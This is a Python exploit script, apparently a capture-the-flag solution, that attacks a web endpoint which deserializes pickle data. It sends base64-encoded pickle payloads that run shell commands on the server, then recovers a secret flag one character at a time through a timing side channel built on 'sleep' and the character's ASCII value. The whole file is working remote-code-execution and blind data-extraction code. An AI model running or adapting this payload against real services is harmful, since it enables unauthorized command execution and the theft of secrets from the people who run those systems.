import base64
import requests
import time

# 1 indexed
# will sleep for the ascii value - the given ofset
def sub_str(start, end):
    with open("substr.sh", mode="rb") as f:
        code = f.read().strip()
    code += b' '
    code += str(start).encode() + b' ' + str(end).encode()
    return (code)

# 1 indexed
def sleep_ascii(idx):
    code = sub_str(idx, idx)
    code = code + b" | od -An -tuC | awk '{$1=$1; print}' | cut -d' ' -f1"
    code = b'sleep $(' + code + b')'
    return code

# 1 indexed
# will sleep for the ascii value - the given ofset
def sleep_ascii_offset(idx, offset):
    code = sub_str(idx, idx)
    code += b" | od -An -tuC | awk '{$1=$1; print}' | cut -d' ' -f1"
    code = b'expr $( ' + code + b' ) - ' + str(offset).encode()
    code = b'sleep $(' + code + b')'
    return code

def send_code(code):
    payload = b"cos\nsystem\n(S'" + code + b"'\ntR"
    exploit = base64.b64encode(payload).decode()
    form = {
            'data': exploit
    }
    start_time = time.time()
    r = requests.post("http://172.18.0.2:3002/deserialize", data=form)
    end_time = time.time()
    elapsed_time = end_time - start_time
    print(f"Request took {elapsed_time:.1f} seconds")
    print(r.status_code)
    print(r.text)
    return elapsed_time

def get_flag_len():
    return 24 #idk broke but i got the length before it broke
    with open('srcipt_len_back.sh', mode='rb') as f:
        code = f.read()

    print(f"script : {code.decode()}")
    flag_len = int(send_code(code))
    print(f"flag_len: {flag_len}")
    return (flag_len)



flag_len = get_flag_len()

flag = ""
for i in range(1, flag_len + 1):
    code = sleep_ascii_offset(i, 33)
    print(f"script : {code.decode()}")
    runtime = send_code(code)
    flag += chr(int(runtime + 33))
    print(f"cur flag: {flag}")

print(f"finished flag: {flag}")




